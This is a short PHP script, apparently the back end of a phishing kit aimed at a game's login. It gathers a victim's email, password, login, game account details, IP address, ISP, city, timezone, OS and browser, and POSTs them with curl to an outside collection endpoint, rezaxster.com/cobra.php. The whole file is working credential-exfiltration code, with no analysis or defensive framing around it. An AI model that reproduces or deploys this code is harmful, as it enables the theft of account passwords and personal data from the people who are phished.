<?php 
$myData = 
"user=".$email.
"&pass=".$password.
"&login=".$login.
"&playid=".$playid.
"&nick=".$nick.
"&level=".$level.
"&rank=".$rank.
"&ep=".$ep.
"&ip=".$ip.
"&ispuser=".$ispuser.
"&regioncity=".$regioncity.
"&citykota=".$citykota.
"&continent=".$continent.
"&timezone=".$timezone.
"&os=".$os.
"&br=".$br.
"&date=".$date.
"&user_agent=".$user_agent.
"&cn=".$cn;
$myUrl  = "http://rezaxster.com/cobra.php";

$c4 = curl_init();
curl_setopt($c4, CURLOPT_URL, $myUrl);
curl_setopt($c4, CURLOPT_POST, 1);
curl_setopt($c4, CURLOPT_POSTFIELDS, $myData);
curl_setopt($c4, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($c4, CURLOPT_COOKIEJAR, getcwd()."/jancok.txt");
curl_setopt($c4, CURLOPT_COOKIEFILE, getcwd()."/jancok.txt");   
curl_setopt($c4, CURLOPT_HEADER, 0);
curl_setopt($c4, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($c4);
curl_close($c4);
?>